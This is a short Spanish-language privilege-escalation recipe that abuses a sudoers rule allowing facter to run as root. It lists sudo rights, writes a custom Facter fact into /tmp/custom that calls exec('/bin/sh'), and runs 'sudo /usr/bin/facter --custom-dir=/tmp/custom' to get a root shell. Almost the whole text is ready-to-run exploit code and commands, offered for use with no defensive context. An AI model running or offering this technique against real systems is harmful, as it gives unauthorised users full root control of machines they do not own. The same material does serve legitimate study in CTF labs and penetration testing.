Escalada de Privilegios: Sudoers (facter)

Enumerar sudoers

sudo -l

Crear exploit.sh

#!/bin/bash
mkdir /tmp/custom
cat > /tmp/custom/shell.rb << EOF
Facter.add('shell') do
  setcode do
    exec('/bin/sh')
  end
end
EOF

Ejecutar exploit y facter

# Otorgar permiso de ejecución
chmod +x exploit.sh
# Ejecutar exploit
./exploit.sh
# Obtener consola como root
sudo /usr/bin/facter --custom-dir=/tmp/custom
